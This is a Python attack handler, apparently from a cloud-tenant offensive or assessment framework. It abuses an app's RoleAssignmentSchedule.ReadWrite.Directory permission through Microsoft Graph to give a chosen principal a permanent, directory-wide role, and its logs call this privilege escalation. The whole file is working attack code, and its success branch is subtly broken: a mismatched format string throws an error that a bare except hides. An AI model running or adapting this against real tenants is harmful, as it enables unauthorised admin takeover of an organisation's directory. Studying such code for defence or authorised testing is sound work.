from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests
from datetime import datetime

logger = logger.createLogger('attacks.handlers.role_schedule_handler')


class RoleSchedule_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "RoleAssignmentSchedule.ReadWrite.Directory" in request.roles:
            status = False
            attack_name = "roleAssignmentScheduleVectors"
            message = ""
            error = "roleAssignmentScheduleVectors - failed"
            conf = request.attack_config['RoleSchedule']
            
            logger.debug("RoleAssignmentSchedule.ReadWrite.Directory - Allows the app to read, update, and delete policies for privileged role-based access control (RBAC) assignments of your company's directory, without a signed-in user.")
            logger.debug("Attack vector - privilege escalation.")         
            try:
                current_time = datetime.now()
                formatted_time = current_time.strftime("%Y-%m-%dT%H:%M:%SZ")

                create_message_URL = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests"
                message_obj = {
                    "action": "adminAssign",
                    "justification": "justification of fraud",
                    "roleDefinitionId": conf["roleDefinitionId"],
                    "directoryScopeId": "/",
                    "principalId": conf["principalId"],
                    "scheduleInfo": {
                        "startDateTime": formatted_time,
                        "expiration": {
                            "type": "NoExpiration"
                        }
                    }
                }

                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                if result.status_code == 201:
                    message += "Added a role of %s to  \n" % (conf["roleDefinitionId"], conf["principalId"])
                    status = True
  
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in role_schedule_handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
        return super().handle(request,responses)
